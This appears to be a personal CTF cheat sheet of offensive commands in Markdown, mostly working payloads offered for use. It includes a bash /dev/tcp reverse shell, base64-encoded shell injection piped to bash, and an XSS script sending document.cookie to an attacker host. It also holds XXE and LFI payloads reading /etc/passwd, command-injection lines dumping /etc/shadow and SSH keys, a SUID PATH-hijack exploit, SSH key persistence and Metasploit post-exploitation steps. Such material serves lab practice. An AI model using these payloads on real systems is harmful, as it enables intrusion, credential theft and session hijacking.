# docs-ctf-cheatsheet
## NMAP
```bash
nmap -sC -sV -oA nmap/initial IPADRESS
nmap -p- -T5 -sC -sV -oA nmap/second IPADRESS
nmap -p443 --script ssl-enum-ciphers IPADRESS
```
> -A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one\
-p- : Enables scanning across all ports, not just the top 1000\
-sC : Scan with default NSE scripts. Considered useful for discovery and safe\
-sV : Attempts to determine the version of the service running on port\
-oA [dir] all output to [dir]

## REVERSE SHELL
1. setup listener on my machine:
nc -lvnp 8081
2. go to\
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\
and try them out on target machine

### simple bash reverse shell
```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```
## ENCODING STUFF

### replace bad char
>see https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions
```bash
space : ${IFS}
```

### base 64 encoding
craft encoded rs: `echo -n "[REVERSE SHELL]" | base64 -w 0`\
inject encoded rs on target: `echo -n [ENCODED REVERSE SHELL] | base64 -d | bash`
> sometimes base64 encoding conatins + chars for spaces, if so add more spaces to remove + chars (sice they might be bad chars)\
> this also works for ther payloads (not only rs)

## INTERACTIVE SHELL
target: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, hit <kbd>CTRL</kbd> + <kbd>z</kbd>\
attacker: `stty raw -echo`, `fg`, hit <kbd>Enter</kbd>, <kbd>Enter</kbd>
### optional
target: `export TERM=xterm`\
attacker: `stty -a` shows rows `r` and collumns `c`\
target: `stty rows r cols c`
## NETCAT
### send data

reciever:
```bash
nc -l -p 1234 > FILE.NAME
```
(sometimes netcat instead of nc!)


sender:
```bash
nc -w 3 DESTINATION 1234 < FILE.NAME
```

## TRANSFER DATA/FILES
### send data via HTTP Server
sender:
```bash
python -m SimpleHTTPServer 8083
python3 -m http.server 8083
```
reciever:
```bash
curl IPADRESSSENDER:8083/FILE.NAME
curl 10.10.IP.IP:8083/linpeas.sh > lp.sh
wget IPADRESSSENDER:8083/FILE.NAME
```
if curl is not installed make your own!
```bash
$ function __curl() {
read proto server path <<<$(echo ${1//// })
DOC=/${path// //}
HOST=${server//:*}
PORT=${server//*:}
[[ x"${HOST}" == x"${PORT}" ]] && PORT=80
exec 3<>/dev/tcp/${HOST}/$PORT
echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
(while read line; do
 [[ "$line" == $'\r' ]] && break
done && cat) <&3
exec 3>&-
}
```

### send data via Base64 Encoding
on attacker: `base64 -w 0 [FileName]`
on target: `echo "[Base64EncodedFile]" | base64 -d > [FileName]` 


## MSF
search: `search [SEARCHTERM]`\
send data: `upload /path/to/file`\
run exploit in background and enter the session: `run -j`\
sessions: `sessions -i [session id]`\
get "normal" shell: `shell`\
move out of a session: <kbd>CTRL</kbd> + <kbd>z</kbd>

## CHECK IF SOMETHING IS EXECUTED
attacker: `sudo tcpdump ip proto \icmp -i tun0`\
target: `ping [local tun0 ip] -c 1`

## XML EXTERNAL ENTITY (XXE)
try :
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
```xml
<!DOCTYPE replace [<!ENTITY name "success"> ]>
 <userInfo>
  <firstName>xxe</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```
## CROSS SITE SCRIPTING (XSS)
* DOM Based
> JavaScript execution happens directly in browser without any new pages being loaded or data submitted to backend code.
* Reflected
> When user-supplied data in an HTTP request is included in the webpage source without any validation. (Cookie Stealing!)
* Stored
> XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page. (e.g. XSS in Forum Post)
* Blind
> Simmilar to stored, just payload is not seen working. (e.g. contact form)

### XSS PAYLOADS
```html
<script>alert(“Hello World”)</script>
document.write
<img src=x onerror=alert(2)>
<script>fetch('/settings?new_password=pass123');</script>
```
* XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)
* Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner

### COOKIE STEALING WITH XSS
> to steal a cookie a location to recieve the results is required, local ip or hookbin.com works well
```javascript
<script>var i=new Image;i.src="http://[IP OR DOMAIN : PORT]/?"+document.cookie;</script>
```

## LOCAL FILE INCLUSION (LFI)
```php
include
require
include_once 
require_once
```
> these PHP functions might lead to LFI. It is possible to read files without executing them (like PHP likes to do) or send data like so:
```url
http://domain/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
http://domain/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==
```
> LFI can lead to RCE.

## COMMAND INJECTION PAYLOADS
### Linux
```bash
whoami
id
ifconfig
ip addr
uname -a
ps -ef
cat /etc/passwd
cat /etc/shadow
cat /home/USERNAME/.ssh/id_rsa
```
### Windows
``` shell
whoami
ver
ipconfig
tasklist
netstat -an
```

## POST EXPLOITATION WINDOWS
```powershell
Get-WmiObject -Class win32_OperatingSystem (Power Shell)
run post/windows/gather/checkvm (Metasploit) - check if vm
run post/multi/recon/local_exploit_suggester (Metasploit)
run post/windows/manage/enable_rdp (Metasploit)
ipconfig
try migrate spoolsv.exe
getuid
sysinfo
getprivs
run autoroute -s [SUBNET IP] -n 255.255.255.0
```

## LIST SUDO COMMANDS
```bash
sudo -l
```

## Enummeration Scripts
### Local
* LinEnum
* LinPEAS
* WinPEAS
* pspys - lists running processes, good for figguering out what an app does
* deepce - docker enummeration/container escape
### Remote
* enum4linux [OPTIONS] [IP] - works for windows and linux SMB SAMBA

## SUID
find SUID : `find / -perm -u=s -type f 2>/dev/null`\
Exploit /usr/bin/menu with SUID :
```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

## ADD DOMAIN
```bash
sudo nano /etc/hosts
```
> add [IPADRESS] [DOMAIN], save and it should work!

## SSH:
```bash
ssh-keygen -f [NAME]
```
>now i can write the [NAME].pub file content (except for the last part with my USER@IP) and add “ssh-rsa “ before the key if not there) to the /home/[USER]/.ssh/authorized_keys/, then
```bash
chmod 700 [NAME]
ssh -i [NAME] [USER]@[IP]
```

## PYTHON VIRTUAL ENVIRONMENT
env init: `python3 -m venv [NAME UMGEBUNG]`\
env load: `source [NAME UMGEBUNG]/bin/activate`\
packet install (in env): `pip3 install [PACKET NAME]`\
env exit: `deactivate`\
show installed packets: `pip3 freeze`

## JAVA-VERSION ARCH LINUX
some programs run only with a certain jre, so you can use the following to set the default jre on your system:
```bash
sudo archlinux-java set java-8-openjdk/jre
```

## TMUX
start new session: `tmux new -s [NAME]`
new panel: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>c</kbd>\
rename panel: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>,</kbd>\
split panel vertical: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>%</kbd>\
split panel horizontal: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>“</kbd>\
navigate between panel: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>arrowkey</kbd>\
resize panel: hold <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>arrowkey</kbd>

## GOBUSTER
```bash
gobuster dir -u http://ADRESS/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
maybe mit +x php
```

## MYSQL
```bash
mysql -u [USER] -p'[PASSWORD]'
```

## HASHCAT (Windows)
```shell
.\hashcat.exe -a [ATTACKTYPE] -m [HASHTYPE] [PATHTOHASHES] [PATHTODICTIONARY] -r [PATHTORULE]
```
>ATTACKTYPE : 0 for dictionary/dictionary-rule attack\
HASHTYPE : tunnelsup.com/hash-analyzer/, hashcat.net/wiki/doku.php?id=example_hashes\
PATHTORULE : \rules\best64.rule is good

## SQLMAP
```bash
sqlmap -r [FULLFILEPATHTOREQUEST] -p [PARAM IN REQ BODY] --proxy="http://127.0.0.1:8080"
sqlmap -u [URL]/?[PARAMNAME]=param1
```
> --dbs : dump database names\
--proxy="http://127.0.0.1:8080"\\
-D [DB] : choose Target Database\
-T [TABLE] : choose Target Table\
-dump : dump target table\
--dbms=[DBTYPE] : choose DBType (mysql)

## SMBClient
```bash
smbclient //[IP]/[DIRECTORY] -U [USERNAME]
```

## NFS
```bash
sudo mount -t nfs [IP]:[tragetdirectory] /tmp/mount/ -nolock
```
